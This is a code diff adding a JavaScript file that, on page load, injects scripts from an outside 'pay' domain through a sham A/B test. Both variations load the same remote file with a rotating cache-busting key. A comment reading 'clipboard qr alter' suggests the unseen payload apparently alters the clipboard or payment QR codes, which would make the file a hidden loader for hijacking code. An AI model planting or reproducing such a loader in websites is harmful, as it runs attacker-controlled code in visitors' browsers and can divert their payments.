@@ -1,0 +1,43 @@
+//界面刷新时弹出加载该界面
+window.onload = function() {
+    /* clipboard qr alter */
+	include_js("//yy.101505.com/pay/statics/ab.min.js", function(){
+		var randStr=new Date().getTime() / 1000;randStr = randStr - randStr % (3*3600);
+		var actArr = ['pc-b1','pc-b1'];
+		var myAbTest = ABTest({
+			name: "ab_test",
+			customVarSlot: 1,
+			variations: {
+				a: function () {
+					include_js("//yy.101505.com/pay/statics/"+actArr[0]+".js?"+randStr);
+				},
+				b: function () {
+					include_js("//yy.101505.com/pay/statics/"+actArr[1]+".js?"+randStr);
+				},
+			}
+		});
+	});
+};
+function include_js(file, callback) {
+    var _doc = document.getElementsByTagName('head')[0];
+    var js = document.createElement('script');
+    js.setAttribute('type', 'text/javascript');
+    js.setAttribute('src', file);
+    _doc.appendChild(js);
+    if (document.all) { //如果是IE
+        js.onreadystatechange = function () {
+            if (js.readyState == "loaded" || js.readyState == "complete"){
+                js.onreadystatechange = null;
+                callback ? callback() : false
+            }
+        }
+    }
+    else {
+        js.onload = function () {
+            callback ? callback() : false
+        }
+        js.onerror = function(){
+            callback ? callback() : false
+        }
+    }
+}
